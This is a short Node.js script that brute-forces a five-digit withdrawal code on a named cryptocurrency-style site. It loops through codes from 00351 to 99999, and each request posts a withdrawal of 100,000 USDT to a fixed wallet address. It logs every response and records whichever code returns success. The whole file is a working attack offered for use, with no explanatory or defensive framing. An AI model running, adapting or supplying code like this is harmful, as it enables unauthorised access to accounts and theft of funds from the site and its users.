const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

// API URL
const API_URL = "https://pipsflow.net/dashboard/database/withdraw_query.php";

// Base form data
const formData = {
  withdraw_type: "Usdt",
  btc_address: "",
  Usdt_address: "TRuVwH1mNtkdytfTJkiaZPensPGdPCTFRn",
  ethereum_address: "",
  bank_name: "",
  acct_no: "",
  acct_name: "",
  acct_swift: "",
  amount: 10000,
};

// Function to pad numbers to 5 digits (e.g., 00001)
const padNumber = (num) => String(num).padStart(5, "0");

// Function to make POST requests
const makePostRequest = async (password) => {
  try {
    // Create FormData instance
    const form = new FormData();
    // Object.entries({
    //   ...formData,
    //   with_code: password,
    // }).forEach(([key, value]) => {
    //   form.append(key, value);
    // });
    form.append("withdraw_type", "Usdt");
    form.append("Usdt_address", "TRuVwH1mNtkdytfTJkiaZPensPGdPCTFRn");
    form.append("amount", 100000);
    form.append("with_code", password);

    // Log the headers and body for debugging
    // console.log("Form Headers:", form.getHeaders());
    // console.log("Form Data:", form);

    // Make POST request
    const response = await axios.post(API_URL, form, {
      headers: form.getHeaders(),
    });

    // console.error("Response Data:", response.data);
    console.log(`Trying password: ${password}, Status: ${response.status}`);

    // Save the data to the file system, regardless of success or failure
    fs.writeFileSync(
      "response.json",
      JSON.stringify(
        {
          formData: { ...formData, with_code: password },
          response: response.data,
        },
        null,
        2
      )
    );

    // Check for success (adjust based on actual response content)
    if (response.status === 200 && response.data.includes("Success")) {
      console.log(`Successful password found: ${password}`);
      fs.writeFileSync(
        "success.json",
        JSON.stringify(
          {
            formData: { ...formData, with_code: password },
            response: response.data,
          },
          null,
          2
        )
      );
      return true;
    }
  } catch (error) {
    console.error(`Error with password ${password}:`, error.message);
    if (error.response) {
      console.error("Response Data:", error.response.data);
    }
  }

  return false;
};

// Main function to iterate over all passwords
const bruteForce = async () => {
  console.log("Starting brute force...");
  for (let i = 351; i <= 99999; i++) {
    const password = padNumber(i);
    const isSuccess = await makePostRequest(password);
    console.log("IS_SUCCESS", isSuccess);
    if (isSuccess) {
      console.log("Password found! Exiting...");
      break;
    }
  }
  console.log("Brute force completed.");
};

// Run the brute force
bruteForce();
